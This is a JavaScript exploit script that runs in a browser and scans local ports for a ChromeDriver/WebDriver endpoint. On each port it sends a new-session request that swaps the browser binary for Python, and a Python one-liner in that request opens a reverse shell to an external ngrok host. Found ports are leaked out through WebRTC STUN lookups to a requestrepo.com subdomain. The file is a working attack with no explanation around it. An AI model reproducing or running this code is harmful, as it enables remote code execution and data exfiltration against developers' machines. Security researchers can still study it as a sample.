const options = {
  mode: "no-cors",
  method: "POST",
  body: JSON.stringify({
    capabilities: {
      alwaysMatch: {
        "goog:chromeOptions": {
          binary: "/usr/local/bin/python",
          args: ["-c", "import os,pty,socket;s=socket.socket();s.connect(('0.tcp.ap.ngrok.io',14230));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('sh')"],
        },
      },
    },
  }),
};

async function leak(data) {
  let c = { iceServers: [{ urls: `stun:${data}.2q1widwk.requestrepo.com` }] };
  let p = new RTCPeerConnection(c);
  p.createDataChannel("");
  await p.setLocalDescription();
}

const scanPorts = async () => {
  const startPort = 32768;
  const endPort = 61000;
  const timeoutMs = 100; // Fast timeout for local scanning

  const checks = [];

  for (let port = startPort; port < endPort; port++) {
    const check = (async () => {
      const controller = new AbortController();
      const id = setTimeout(() => controller.abort(), timeoutMs);

      try {
        await fetch(`http://127.0.0.1:${port}/session`, {
          ...options,
          signal: controller.signal,
        });
        leak(`found${port}`);
      } catch (error) {
        // Ignore errors (timeouts/refused connections)
      } finally {
        clearTimeout(id);
      }
    })();

    checks.push(check);
  }

  await Promise.all(checks);
  leak('complete');
};

scanPorts();